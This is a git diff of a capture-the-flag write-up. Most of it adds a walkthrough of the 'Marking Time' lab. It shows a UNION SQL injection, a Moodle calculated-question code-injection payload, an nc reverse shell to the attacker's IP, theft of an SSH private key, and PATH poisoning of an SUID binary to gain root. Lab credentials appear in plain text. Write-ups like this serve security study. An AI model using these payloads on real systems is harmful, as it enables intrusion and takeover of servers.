@@ -87,8 +87,8 @@ Strangely, this login doesnt work... try changing the id(since id is the col num
 
 `' UNION ALL SELECT 1, CONCAT(name, ' ',password),3 FROM hardusers WHERE id=2 -- `
 
-_Todhunter Abs01ut3Sm3gh3ad
-Lanstrom aA12!^gtfo! _
+_Todhunter Abs01ut3Sm3gh3ad_
+_Lanstrom aA12!^gtfo!_
 
 I was able to ssh into the machine as the Lanstrom user...
 
@@ -304,3 +304,80 @@ And we got root!!! Wow, my first buffer overflow :)
 ![partycannon](/SiteImages/partycannon.png)
 
 ## Marking Time:
+With this challenge, we get a set of creds at the start:
+
+![startcred](/SiteImages/CTFpics/MarkingTimeStartCred.png)
+
+We also have a picture of a monitor with a postit note on it...
+
+![postit](/SiteImages/CTFpics/MarkingTimePostit.png)
+
+Looking at the ip address, all we get is a blank web page that has text “it works” on it... checking robots.txt we get something nice :P
+
+![robotsmarking](/SiteImages/CTFpics/MarkingTimeRobots.png)
+
+Go to working directory and get a marking.zone file.
+
+![markingzone](/SiteImages/CTFpics/MarkingTimeZone.png)
+
+A Domain Name System zone file is a text file that describes a DNS zone. A DNS zone is a subset, often a single domain, of the hierarchical domain name structure of the DNS.
+
+Think of this as a result of a zone transfer... 
+
+the hosts file on linux contains a list of host names and ip addresses. It is used to translate hostnames into ip addresses... when you look up a domain, the system will look into the hosts file to get the appropriate ip needed to connect.
+
+Adding `192.168.72.118       moodle.marking.ioc` to the hosts file and typing _moodle.marking.ioc_ in our browser gives us the moodle web page...
+
+![moodleastro](/SiteImages/CTFpics/MarkingTimeAstronav.png)
+
+Log in to moodle with user _rimmer_ and password _G@zpach0_
+
+There doesnt seem to be much we can do as a student user, but as a teacher we could do some damage... teacher is todhunter so try login with user _todhunter_ and password _IAm@F1sh_ (from the postit note) 
+
+Yay! We are now logged in as a teacher and can do some interesting things...
+
+![teacher](/SiteImages/CTFpics/MarkingTimeTeacher.png)
+
+There is a vulnerability in moodle to do with the way it handles maths formulae in calculation type questions... we can make our own question and add some code in place of a formula...
+
+Add a new question to the existing quiz of type 'calculated'.
+
+![formulae](/SiteImages/CTFpics/MarkingTimeFormula.png)
+
+Input malicious code in maths formula such as `/*{a*/`$_GET[ethan]`;//{x}}`
+
+save changes
+next page
+
+Set up listener on local machine port 1234.
+At end of url, add `&ethan=(date; nc 192.168.42.5 1234 -e /bin/bash)`
+Get a shell!
+
+In _hollister_ directory there is _user.txt_ we cant read and the users private ssh key.
+Save _id_rsa_ to local machine. SSH into target as user _hollister_ with the key, making sure correct permissions are set on the key (chmod 600).
+
+No password needed. Get user!
+There is a program with SUID bit set in user directory. Save to local machine for inspection. Seems to read the contents of the user.txt file.
+
+![checkfile](/SiteImages/CTFpics/MarkingTimeCheckfile.png)
+
+Looks like it uses cat to read the file, check strings...
+
+![timecat](/SiteImages/CTFpics/MarkingTimeCat.png)
+
+It doesnt seem to specify the path for the cat command! Looks like we could do some path poisoning here...
+
+![pathtime](/SiteImages/CTFpics/MarkingTimePath.png)
+
+Now we have changed it so that it checks the current directory for binaries first... now lets make our own file called cat and have /bin/sh inside it to give us a shell as root when it is accessed by the checkfile binary!
+
+Make sure to give evil cat execute perms...
+
+![timeroot](/SiteImages/CTFpics/MarkingTimeRoot.png)
+
+Boom! Get root and another one done.
+
+## Martryoshka:
+This one seems to be a steg challenge, a martryoshka is some sort of russian doll thing with more of those little dolls inside of it.
+
+It starts off with an image that has a qr code in it, needs to be changed a bit so that it can be read properly since it cant be read very well on a dark background. Change exposure with an image editor like gimp to make it white and we get our first flag!
